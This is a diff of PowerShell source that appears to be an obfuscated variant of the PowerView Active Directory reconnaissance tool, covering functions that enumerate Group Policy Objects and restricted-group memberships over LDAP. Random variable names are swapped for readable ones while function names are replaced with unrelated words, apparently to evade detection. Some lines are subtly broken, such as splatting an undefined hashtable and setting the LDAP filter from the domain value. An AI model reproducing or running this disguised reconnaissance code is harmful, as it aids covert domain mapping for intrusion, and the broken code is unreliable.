+        $Identity,
         [Parameter(ParameterSetName = 'ComputerIdentity')]
         [Alias('ComputerName')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $HdCnajIa99,
+        $ComputerIdentity,
         [Parameter(ParameterSetName = 'UserIdentity')]
         [Alias('UserName')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $rqcypngr99,
+        $UserIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $GDUlOJMy99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $GPOSearcher = deadly @SearcherArguments
     }
     PROCESS {
-        if ($GDUlOJMy99) {
+        if ($GPOSearcher) {
             if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
-                $bjrWoTvw99 = @()
-                if ($PPosolen99['Properties']) {
-                    $QEbPmGkV99 = $PPosolen99['Properties']
+                $GPOAdsPaths = @()
+                if ($SearcherArguments['Properties']) {
+                    $OldProperties = $SearcherArguments['Properties']
                 }
-                $PPosolen99['Properties'] = 'distinguishedname,dnshostname'
-                $vnhDKlDn99 = $Null
+                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
+                $TargetComputerName = $Null
                 if ($PSBoundParameters['ComputerIdentity']) {
-                    $PPosolen99['Identity'] = $HdCnajIa99
-                    $cXOPCAwl99 = doubtlessly @SearcherArguments -FindOne | Select-Object -First 1
-                    if(-not $cXOPCAwl99) {
-                        Write-Verbose "[roomfuls] Computer '$HdCnajIa99' not found!"
+                    $SearcherArguments['Identity'] = $ComputerIdentity
+                    $Computer = sonorous @SearcherArguments -FindOne | Select-Object -First 1
+                    if(-not $Computer) {
+                        Write-Verbose "[meshed] Computer '$ComputerIdentity' not found!"
                     }
-                    $HxrwipaH99 = $cXOPCAwl99.distinguishedname
-                    $vnhDKlDn99 = $cXOPCAwl99.dnshostname
+                    $ObjectDN = $Computer.distinguishedname
+                    $TargetComputerName = $Computer.dnshostname
                 }
                 else {
-                    $PPosolen99['Identity'] = $rqcypngr99
-                    $User = township @SearcherArguments -FindOne | Select-Object -First 1
+                    $SearcherArguments['Identity'] = $UserIdentity
+                    $User = prissier @SearcherArguments -FindOne | Select-Object -First 1
                     if(-not $User) {
-                        Write-Verbose "[roomfuls] User '$rqcypngr99' not found!"
+                        Write-Verbose "[meshed] User '$UserIdentity' not found!"
                     }
-                    $HxrwipaH99 = $User.distinguishedname
+                    $ObjectDN = $User.distinguishedname
                 }
-                $Atridfde99 = @()
-                $Atridfde99 += $HxrwipaH99.split(',') | ForEach-Object {
+                $ObjectOUs = @()
+                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                     if($_.startswith('OU=')) {
-                        $HxrwipaH99.SubString($HxrwipaH99.IndexOf("$($_),"))
+                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                     }
                 }
-                Write-Verbose "[roomfuls] object OUs: $Atridfde99"
-                if ($Atridfde99) {
-                    $PPosolen99.Remove('Properties')
-                    $HGtFWdRb99 = $False
-                    ForEach($jfyKpQwz99 in $Atridfde99) {
-                        $PPosolen99['Identity'] = $jfyKpQwz99
-                        $bjrWoTvw99 += ivies @SearcherArguments | ForEach-Object {
+                Write-Verbose "[meshed] object OUs: $ObjectOUs"
+                if ($ObjectOUs) {
+                    $SearcherArguments.Remove('Properties')
+                    $InheritanceDisabled = $False
+                    ForEach($ObjectOU in $ObjectOUs) {
+                        $SearcherArguments['Identity'] = $ObjectOU
+                        $GPOAdsPaths += vaporizes @SearcherArguments | ForEach-Object {
                             if ($_.gplink) {
                                 $_.gplink.split('][') | ForEach-Object {
                                     if ($_.startswith('LDAP')) {
                                         $Parts = $_.split(';')
                                         $GpoDN = $Parts[0]
-                                        $zsOmScFL99 = $Parts[1]
-                                        if ($HGtFWdRb99) {
-                                            if ($zsOmScFL99 -eq 2) {
+                                        $Enforced = $Parts[1]
+                                        if ($InheritanceDisabled) {
+                                            if ($Enforced -eq 2) {
                                                 $GpoDN
                                             }
                                         }
@@ -6340,16 +6340,16 @@ function roomfuls {
                                 }
                             }
                             if ($_.gpoptions -eq 1) {
-                                $HGtFWdRb99 = $True
+                                $InheritanceDisabled = $True
                             }
                         }
                     }
                 }
-                if ($vnhDKlDn99) {
-                    $UFJqwyIQ99 = (tussled -ComputerName $vnhDKlDn99).SiteName
-                    if($UFJqwyIQ99 -and ($UFJqwyIQ99 -notlike 'Error*')) {
-                        $PPosolen99['Identity'] = $UFJqwyIQ99
-                        $bjrWoTvw99 += shoddiness @SearcherArguments | ForEach-Object {
+                if ($TargetComputerName) {
+                    $ComputerSite = (scrappy -ComputerName $TargetComputerName).SiteName
+                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
+                        $SearcherArguments['Identity'] = $ComputerSite
+                        $GPOAdsPaths += our @SearcherArguments | ForEach-Object {
                             if($_.gplink) {
                                 $_.gplink.split('][') | ForEach-Object {
                                     if ($_.startswith('LDAP')) {
@@ -6360,11 +6360,11 @@ function roomfuls {
                         }
                     }
                 }
-                $RrtlyuUC99 = $HxrwipaH99.SubString($HxrwipaH99.IndexOf('DC='))
-                $PPosolen99.Remove('Identity')
-                $PPosolen99.Remove('Properties')
-                $PPosolen99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$RrtlyuUC99)"
-                $bjrWoTvw99 += farrowing @SearcherArguments | ForEach-Object {
+                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
+                $SearcherArguments.Remove('Identity')
+                $SearcherArguments.Remove('Properties')
+                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
+                $GPOAdsPaths += dermatitis @SearcherArguments | ForEach-Object {
                     if($_.gplink) {
                         $_.gplink.split('][') | ForEach-Object {
                             if ($_.startswith('LDAP')) {
@@ -6373,14 +6373,14 @@ function roomfuls {
                         }
                     }
                 }
-                Write-Verbose "[roomfuls] GPOAdsPaths: $bjrWoTvw99"
-                if ($QEbPmGkV99) { $PPosolen99['Properties'] = $QEbPmGkV99 }
-                else { $PPosolen99.Remove('Properties') }
-                $PPosolen99.Remove('Identity')
-                $bjrWoTvw99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
-                    $PPosolen99['SearchBase'] = $_
-                    $PPosolen99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
-                    farrowing @SearcherArguments | ForEach-Object {
+                Write-Verbose "[meshed] GPOAdsPaths: $GPOAdsPaths"
+                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
+                else { $SearcherArguments.Remove('Properties') }
+                $SearcherArguments.Remove('Identity')
+                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
+                    $SearcherArguments['SearchBase'] = $_
+                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
+                    dermatitis @SearcherArguments | ForEach-Object {
                         if ($PSBoundParameters['Raw']) {
                             $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                         }
@@ -6392,83 +6392,83 @@ function roomfuls {
                 }
             }
             else {
-                $afFJXkRc99 = ''
-                $kXbEpVCq99 = ''
-                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                    if ($QghnbJOP99 -match 'LDAP://|^CN=.*') {
-                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                $IdentityFilter = ''
+                $Filter = ''
+                $Identity | Where-Object {$_} | ForEach-Object {
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[roomfuls] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                            $PPosolen99['Domain'] = $BvhyhWZG99
-                            $GDUlOJMy99 = watersides @SearcherArguments
-                            if (-not $GDUlOJMy99) {
-                                Write-Warning "[roomfuls] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[meshed] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GPOSearcher = deadly @SearcherArguments
+                            if (-not $GPOSearcher) {
+                                Write-Warning "[meshed] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($QghnbJOP99 -match '{.*}') {
-                        $afFJXkRc99 += "(name=$QghnbJOP99)"
+                    elseif ($IdentityInstance -match '{.*}') {
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                     else {
                         try {
-                            $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                            $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                            $IdentityFilter += "(objectguid=$GuidByteString)"
                         }
                         catch {
-                            $afFJXkRc99 += "(displayname=$QghnbJOP99)"
+                            $IdentityFilter += "(displayname=$IdentityInstance)"
                         }
                     }
                 }
-                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                    $kXbEpVCq99 += "(|$afFJXkRc99)"
+                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                    $Filter += "(|$IdentityFilter)"
                 }
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[roomfuls] Using additional LDAP filter: $HOOTOEqu99"
-                    $kXbEpVCq99 += "$HOOTOEqu99"
+                    Write-Verbose "[meshed] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
-                $GDUlOJMy99.filter = "(&(objectCategory=groupPolicyContainer)$kXbEpVCq99)"
-                Write-Verbose "[roomfuls] filter string: $($GDUlOJMy99.filter)"
-                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $GDUlOJMy99.FindOne() }
-                else { $pfqXXMQd99 = $GDUlOJMy99.FindAll() }
-                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
+                Write-Verbose "[meshed] filter string: $($GPOSearcher.filter)"
+                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
+                else { $Results = $GPOSearcher.FindAll() }
+                $Results | Where-Object {$_} | ForEach-Object {
                     if ($PSBoundParameters['Raw']) {
                         $GPO = $_
                         $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                     }
                     else {
-                        if ($PSBoundParameters['SearchBase'] -and ($FNgTGwmR99 -Match '^GC://')) {
-                            $GPO = Buddy -Properties $_.Properties
+                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
+                            $GPO = bookie -Properties $_.Properties
                             try {
                                 $GPODN = $GPO.distinguishedname
-                                $RaMlsWUB99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                                $SONHImbN99 = "\\$RaMlsWUB99\SysVol\$RaMlsWUB99\Policies\$($GPO.cn)"
-                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $SONHImbN99
+                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
+                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                             }
                             catch {
-                                Write-Verbose "[roomfuls] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
+                                Write-Verbose "[meshed] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                             }
                         }
                         else {
-                            $GPO = Buddy -Properties $_.Properties
+                            $GPO = bookie -Properties $_.Properties
                         }
                         $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                     }
                     $GPO
                 }
-                if ($pfqXXMQd99) {
-                    try { $pfqXXMQd99.dispose() }
+                if ($Results) {
+                    try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[roomfuls] Error disposing of the Results object: $_"
+                        Write-Verbose "[meshed] Error disposing of the Results object: $_"
                     }
                 }
-                $GDUlOJMy99.dispose()
+                $GPOSearcher.dispose()
             }
         }
     }
 }
-function factoring {
+function infantry {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GPOGroup')]
     [CmdletBinding()]
@@ -6476,172 +6476,172 @@ function factoring {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [Switch]
-        $tOlpaNBs99,
+        $ResolveMembersToSIDs,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $gshqUOUz99 = @{}
-        if ($PSBoundParameters['Domain']) { $gshqUOUz99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $gshqUOUz99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
-        $NHkmSGFw99 = [System.StringSplitOptions]::RemoveEmptyEntries
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $ConvertArguments = @{}
+        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
+        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
-        roomfuls @SearcherArguments | ForEach-Object {
-            $swqoxVyH99 = $_.displayname
-            $cgXwtZoc99 = $_.name
-            $ZBoaNOpR99 = $_.gpcfilesyspath
-            $cqtcZjht99 =  @{ 'GptTmplPath' = "$ZBoaNOpR99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
-            if ($PSBoundParameters['Credential']) { $cqtcZjht99['Credential'] = $gxazvivN99 }
-            $Inf = Tuscon @ParseArgs
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
+        meshed @SearcherArguments | ForEach-Object {
+            $GPOdisplayName = $_.displayname
+            $GPOname = $_.name
+            $GPOPath = $_.gpcfilesyspath
+            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
+            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
+            $Inf = remounts @ParseArgs
             if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
-                $VLqljbSI99 = @{}
-                ForEach ($AjSokHtI99 in $Inf.'Group Membership'.GetEnumerator()) {
-                    $Group, $UpuwtwlL99 = $AjSokHtI99.Key.Split('__', $NHkmSGFw99) | ForEach-Object {$_.Trim()}
-                    $BmpsASpP99 = $AjSokHtI99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
+                $Memberships = @{}
+                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
+                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
+                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                     if ($PSBoundParameters['ResolveMembersToSIDs']) {
-                        $RcFXGpYz99 = @()
-                        ForEach ($cgTuSBdj99 in $BmpsASpP99) {
-                            if ($cgTuSBdj99 -and ($cgTuSBdj99.Trim() -ne '')) {
-                                if ($cgTuSBdj99 -notmatch '^S-1-.*') {
-                                    $AimEeBqa99 = @{'ObjectName' = $cgTuSBdj99}
-                                    if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
-                                    $TBSJNJUH99 = gain @ConvertToArguments
-                                    if ($TBSJNJUH99) {
-                                        $RcFXGpYz99 += $TBSJNJUH99
+                        $GroupMembers = @()
+                        ForEach ($Member in $MembershipValue) {
+                            if ($Member -and ($Member.Trim() -ne '')) {
+                                if ($Member -notmatch '^S-1-.*') {
+                                    $ConvertToArguments = @{'ObjectName' = $Member}
+                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                    $MemberSID = concurs @ConvertToArguments
+                                    if ($MemberSID) {
+                                        $GroupMembers += $MemberSID
                                     }
                                     else {
-                                        $RcFXGpYz99 += $cgTuSBdj99
+                                        $GroupMembers += $Member
                                     }
                                 }
                                 else {
-                                    $RcFXGpYz99 += $cgTuSBdj99
+                                    $GroupMembers += $Member
                                 }
                             }
                         }
-                        $BmpsASpP99 = $RcFXGpYz99
+                        $MembershipValue = $GroupMembers
                     }
-                    if (-not $VLqljbSI99[$Group]) {
-                        $VLqljbSI99[$Group] = @{}
+                    if (-not $Memberships[$Group]) {
+                        $Memberships[$Group] = @{}
                     }
-                    if ($BmpsASpP99 -isnot [System.Array]) {$BmpsASpP99 = @($BmpsASpP99)}
-                    $VLqljbSI99[$Group].Add($UpuwtwlL99, $BmpsASpP99)
+                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
+                    $Memberships[$Group].Add($Relation, $MembershipValue)
                 }
-                ForEach ($AjSokHtI99 in $VLqljbSI99.GetEnumerator()) {
-                    if ($AjSokHtI99 -and $AjSokHtI99.Key -and ($AjSokHtI99.Key -match '^\*')) {
-                        $LmXmVdGr99 = $AjSokHtI99.Key.Trim('*')
-                        if ($LmXmVdGr99 -and ($LmXmVdGr99.Trim() -ne '')) {
-                            $SZjbzmKX99 = woodmen -ObjectSID $LmXmVdGr99 @ConvertArguments
+                ForEach ($Membership in $Memberships.GetEnumerator()) {
+                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
+                        $GroupSID = $Membership.Key.Trim('*')
+                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
+                            $GroupName = armpits -ObjectSID $GroupSID @ConvertArguments
                         }
                         else {
-                            $SZjbzmKX99 = $False
+                            $GroupName = $False
                         }
                     }
                     else {
-                        $SZjbzmKX99 = $AjSokHtI99.Key
-                        if ($SZjbzmKX99 -and ($SZjbzmKX99.Trim() -ne '')) {
-                            if ($SZjbzmKX99 -match 'Administrators') {
-                                $LmXmVdGr99 = 'S-1-5-32-544'
+                        $GroupName = $Membership.Key
+                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
+                            if ($Groupname -match 'Administrators') {
+                                $GroupSID = 'S-1-5-32-544'
                             }
-                            elseif ($SZjbzmKX99 -match 'Remote Desktop') {
-                                $LmXmVdGr99 = 'S-1-5-32-555'
+                            elseif ($Groupname -match 'Remote Desktop') {
+                                $GroupSID = 'S-1-5-32-555'
                             }
-                            elseif ($SZjbzmKX99 -match 'Guests') {
-                                $LmXmVdGr99 = 'S-1-5-32-546'
+                            elseif ($Groupname -match 'Guests') {
+                                $GroupSID = 'S-1-5-32-546'
                             }
-                            elseif ($SZjbzmKX99.Trim() -ne '') {
-                                $AimEeBqa99 = @{'ObjectName' = $SZjbzmKX99}
-                                if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
-                                $LmXmVdGr99 = gain @ConvertToArguments
+                            elseif ($GroupName.Trim() -ne '') {
+                                $ConvertToArguments = @{'ObjectName' = $Groupname}
+                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                $GroupSID = concurs @ConvertToArguments
                             }
                             else {
-                                $LmXmVdGr99 = $Null
+                                $GroupSID = $Null
                             }
                         }
                     }
-                    $FRFDIlam99 = New-Object PSObject
-                    $FRFDIlam99 | Add-Member Noteproperty 'GPODisplayName' $swqoxVyH99
-                    $FRFDIlam99 | Add-Member Noteproperty 'GPOName' $cgXwtZoc99
-                    $FRFDIlam99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
-                    $FRFDIlam99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
-                    $FRFDIlam99 | Add-Member Noteproperty 'Filters' $Null
-                    $FRFDIlam99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                    $FRFDIlam99 | Add-Member Noteproperty 'GroupSID' $LmXmVdGr99
-                    $FRFDIlam99 | Add-Member Noteproperty 'GroupMemberOf' $AjSokHtI99.Value.Memberof
-                    $FRFDIlam99 | Add-Member Noteproperty 'GroupMembers' $AjSokHtI99.Value.Members
-                    $FRFDIlam99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
-                    $FRFDIlam99
+                    $GPOGroup = New-Object PSObject
+                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
+                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
+                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
+                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
+                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
+                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
+                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
+                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
+                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
+                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
+                    $GPOGroup
                 }
             }
-            $cqtcZjht99 =  @{
-                'GroupsXMLpath' = "$ZBoaNOpR99\MACHINE\Preferences\Groups\Groups.xml"
+            $ParseArgs =  @{
+                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
             }
-            Peiping @ParseArgs | ForEach-Object {
+            embroidered @ParseArgs | ForEach-Object {
                 if ($PSBoundParameters['ResolveMembersToSIDs']) {
-                    $RcFXGpYz99 = @()
-                    ForEach ($cgTuSBdj99 in $_.GroupMembers) {
-                        if ($cgTuSBdj99 -and ($cgTuSBdj99.Trim() -ne '')) {
-                            if ($cgTuSBdj99 -notmatch '^S-1-.*') {
-                                $AimEeBqa99 = @{'ObjectName' = $SZjbzmKX99}
-                                if ($PSBoundParameters['Domain']) { $AimEeBqa99['Domain'] = $SSNUOPgW99 }
-                                $TBSJNJUH99 = gain -Domain $SSNUOPgW99 -ObjectName $cgTuSBdj99
-                                if ($TBSJNJUH99) {
-                                    $RcFXGpYz99 += $TBSJNJUH99
+                    $GroupMembers = @()
+                    ForEach ($Member in $_.GroupMembers) {
+                        if ($Member -and ($Member.Trim() -ne '')) {
+                            if ($Member -notmatch '^S-1-.*') {
+                                $ConvertToArguments = @{'ObjectName' = $Groupname}
+                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                $MemberSID = concurs -Domain $Domain -ObjectName $Member
+                                if ($MemberSID) {
+                                    $GroupMembers += $MemberSID
                                 }
                                 else {
-                                    $RcFXGpYz99 += $cgTuSBdj99
+                                    $GroupMembers += $Member
                                 }
                             }
                             else {
